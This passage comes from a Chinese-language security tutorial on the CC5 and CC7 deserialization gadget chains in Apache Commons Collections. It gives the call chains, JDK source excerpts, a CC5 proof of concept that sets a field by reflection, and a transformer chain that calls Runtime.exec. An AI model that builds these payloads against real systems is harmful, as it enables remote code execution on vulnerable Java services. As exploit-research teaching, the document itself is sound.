punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"cc5\"><a class=\"anchor\" href=\"#cc5\">#</a> CC5</h1>\n<p>和之前的 CC1 LazyMap 链一样，只是入口类不同，使用了<br />\n <code>BadAttributeValueExpException</code></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tGadget chain:</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        ObjectInputStream.readObject()</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            BadAttributeValueExpException.readObject()</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                TiedMapEntry.toString()</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                    LazyMap.get()</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                        ChainedTransformer.transform()</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                            ConstantTransformer.transform()</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                            InvokerTransformer.transform()</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                                Method.invoke()</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                                    Class.getMethod()</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                            InvokerTransformer.transform()</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                                Method.invoke()</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                                    Runtime.getRuntime()</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                            InvokerTransformer.transform()</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                                Method.invoke()</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                                    Runtime.exec()</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tRequires:</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\tcommons-collections</pre></td></tr><tr><td data-num=\"20\"></td><td><pre> */</span></pre></td></tr></table></figure><blockquote>\n<p>TiedMapEntry<br />\n 这个类之前的 CC 链中我们也用到过，不做过多的解释，调用 <code>toString</code>  方法</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">TiedMapEntry</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Map</span> map<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span> key<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>map <span class=\"token operator\">=</span> map<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>key <span class=\"token operator\">=</span> key<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">getKey</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"=\"</span> <span class=\"token operator\">+</span> <span class=\"token function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span> map<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>BadAttributeValueExpException<br />\n 先看一下它的 <code>readObject</code></p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ObjectInputStream</span> ois<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token comment\">// 读取 ObjectInputStream 的 Fields</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token class-name\">ObjectInputStream<span class=\"token punctuation\">.</span>GetField</span> gf <span class=\"token operator\">=</span> ois<span class=\"token punctuation\">.</span><span class=\"token function\">readFields</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\">// Filed 名字为 \"val\" , 赋值给 valObj</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token class-name\">Object</span> valObj <span class=\"token operator\">=</span> gf<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"val\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>valObj <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            val <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>valObj <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            val<span class=\"token operator\">=</span> valObj<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span><span class=\"token function\">getSecurityManager</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                <span class=\"token operator\">||</span> valObj <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Long</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                <span class=\"token operator\">||</span> valObj <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Integer</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                <span class=\"token operator\">||</span> valObj <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Float</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token operator\">||</span> valObj <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Double</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                <span class=\"token operator\">||</span> valObj <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Byte</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token operator\">||</span> valObj <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Short</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                <span class=\"token operator\">||</span> valObj <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Boolean</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token comment\">// 走到 valObj 的 toString 方法</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            val <span class=\"token operator\">=</span> valObj<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// the serialized object is from a version without JDK-8019292 fix</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            val <span class=\"token operator\">=</span> <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span><span class=\"token function\">identityHashCode</span><span class=\"token punctuation\">(</span>valObj<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"@\"</span> <span class=\"token operator\">+</span> valObj<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>只要我们在序列化时将 <code>val</code>  赋值为  <code>tiedMapEntry</code>  就可以了。</p>\n<blockquote>\n<p>BadAttributeValueExpException</p>\n</blockquote>\n<p>实际上 <code>BadAttributeValueExpException</code>  的构造函数可以直接给 <code>val</code>  赋值，但是它会进行一个三目运算，从而调用到 <code>toString</code>  方法，这并不是我们想要的，所以还是要用到反射来改变 <code>val</code>  的值</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span>     <span class=\"token keyword\">public</span> <span class=\"token class-name\">BadAttributeValueExpException</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> val<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>val <span class=\"token operator\">=</span> val <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">?</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">:</span> val<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> val<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>val <span class=\"token operator\">=</span> val <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">?</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">:</span> val<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>CC5 PoC</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">BadAttributeValueExpException</span> badAttributeValueExpException <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">BadAttributeValueExpException</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">BadAttributeValueExpException</span><span class=\"token punctuation\">></span></span> aClass <span class=\"token operator\">=</span> badAttributeValueExpException<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">Field</span> val <span class=\"token operator\">=</span> aClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"val\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        val<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        val<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>badAttributeValueExpException<span class=\"token punctuation\">,</span>tiedMapEntry<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token class-name\">Ser</span><span class=\"token punctuation\">(</span>badAttributeValueExpException<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token class-name\">UnSer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ser.bin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"cc7\"><a class=\"anchor\" href=\"#cc7\">#</a> CC7</h1>\n<p>这条链其实和前面的差不多，只是触发点比较复杂一点，用到了 <code>hashtable</code>  这个类，还是使用 <code>lazyMap</code>  的 <code>get</code>  进行触发。</p>\n<blockquote>\n<p>lazyMap (和之前的一样没有变化)</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformedMaps <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethod\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invoke\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"kate\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token class-name\">ChainedTransformer</span> transform <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> hashMap1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">//        HashMap&lt;Object, Object> hashMap2 = new HashMap&lt;>();</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token class-name\">Map</span> decorateMap1 <span class=\"token operator\">=</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>hashMap1<span class=\"token punctuation\">,</span> transform<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><blockquote>\n<p>找 get 调用点</p>\n</blockquote>\n<p>在 <code>AbstractMap::equals</code>  里进行了调用</p>\n<p><img data-src=\"https://s2.loli.net/2022/10/23/9XZlcaJR86SpCBb.png\" alt=\"2022-10-23_20-54.png\" /><br />\n 但是我们发现  <code>AbstractMap</code>  是个 <code>abstract</code>  类，没有办法实例化，所以要从它的继承类下手，这里找到了 <code>HashMap</code> ，它继承了 <code>AbstractMap</code> ，并没有重写  <code>equals</code>  方法，所以再调用时会走到父类的 <code>equals</code>  方法里。</p>\n<blockquote>\n<p>下一步找谁的里面可以调用到 <code>hashMap</code>  的 <code>equals</code>  方法，并且形参是可控的<br />\n这里找到  <code>Hashtable::reconstitutionPut</code>  里调用了，先看一下调用点</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">,</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> e <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">;</span> e <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span> <span class=\"token punctuation\">;</span> e <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>next<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>hash <span class=\"token operator\">==</span> hash<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> e<span class=\"token punctuation\">.</span>key<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>StreamCorruptedException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>reconstitutionPut</code>  在 <code>Hashtable::readObject</code>  中又进行了调用。<br />\nOK, 现在逻辑上已经走完了，我们开始进行实现。</p>\n<h2 id=\"实现\"><a class=\"anchor\" href=\"#实现\">#</a> 实现</h2>\n<blockquote>\n<p>先实例化一个 <code>Hashtable</code></p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Hashtable</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> objectObjectHashtable <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Hashtable</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>现在我们需要需要序列化这个类，但是之前我们要满足它的一些条件</p>\n<blockquote>\n<p>看一下 <code>readObject</code>  的实现</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>ObjectInputStream</span> s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>         <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token comment\">// Read in the length, threshold, and loadfactor</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        s<span class=\"token punctuation\">.</span><span class=\"token function\">defaultReadObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token comment\">// Read the original length of the array and number of elements</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">int</span> origlength <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">readInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">int</span> elements <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">readInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">// Compute new size with a bit of room 5% to grow but</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\">// no larger than the original size.  Make the length</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">// odd if it's large enough, this helps distribute the entries.</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\">// Guard against the length ending up zero, that's not valid.</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">int</span> length <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>elements <span class=\"token operator\">*</span> loadFactor<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>elements <span class=\"token operator\">/</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">></span> elements <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            length<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>origlength <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> length <span class=\"token operator\">></span> origlength<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            length <span class=\"token operator\">=</span> origlength<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        table <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">,</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">[</span>length<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        threshold <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Math</span><span class=\"token punctuation\">.</span><span class=\"token function\">min</span><span class=\"token punctuation\">(</span>length <span class=\"token operator\">*</span> 